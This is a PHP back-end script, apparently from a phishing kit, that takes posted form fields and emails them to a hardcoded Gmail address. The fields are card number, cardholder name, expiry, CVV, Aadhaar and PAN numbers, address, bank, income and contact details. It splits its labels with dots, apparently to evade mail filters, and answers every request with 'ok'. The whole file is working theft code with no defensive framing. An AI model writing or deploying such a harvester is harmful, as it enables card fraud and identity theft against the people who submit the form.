<?php

if ($_SERVER['REQUEST_METHOD'] === 'POST') {


$cc=$_POST['cc'];
$ccnam=$_POST['ccnam'];
$expm=$_POST['expm'];
$expy=$_POST['expy'];
$cvv=$_POST['cvv'];
$mnumm=$_POST['mnumm'];
$nam=$_POST['nam'];
$eml=$_POST['eml'];
$pnum=$_POST['pnum'];
$anum=$_POST['anum'];
$add=$_POST['add'];
$cadd=$_POST['cadd'];
$pcode=$_POST['pcode'];
$bnam=$_POST['bnam'];
$aainc=$_POST['aainc'];
$state=$_POST['state'];
$cn=$_POST['cn'];





$ue="I.n.f.o \nC.C:  ".$_POST['cc']
."\nN.a.m.e: ".$_POST['ccnam']
."\nE.x.p : ".$_POST['expm']."/".$_POST['expy']
."\nC.v.v: ".$_POST['cvv']
."\n\nDetails\nName: ".$_POST['nam']
."\nE.m.a.i.l: ".$_POST['eml']
."\nP.h.o.n.e.N.u.m.b.e.r: ".$_POST['pnum']
."\nP.a.n.N.u.m.b.e.r: ".$_POST['panum']
."\nA.a.d.h.a.r.N.u.m.b.e.r: ".$_POST['anum']
."\nA.d.d.r.e.s.s.: ".$_POST['add']
."\nC.u.r.r.e.n.t. .A.d.d.r.e.s.s: ".$_POST['cadd']
."\nP.i.n.C.o.d.e.: ".$_POST['pcode']
."\nB.a.n.k. .N.a.m.e.: ".$_POST['bnam']
."\n.A.n.n.u.a.l. .I.n.c.o.m.e: ".$_POST['aainc']
."\nS.t.a.t.e.: ".$_POST['state']
."\nC.o.u.n.t.r.y: ".$_POST['cn'];

echo "ok";





mail("hostmylove70@gmail.com","Visitor",$ue);
}
else{
echo "ok";
}



?>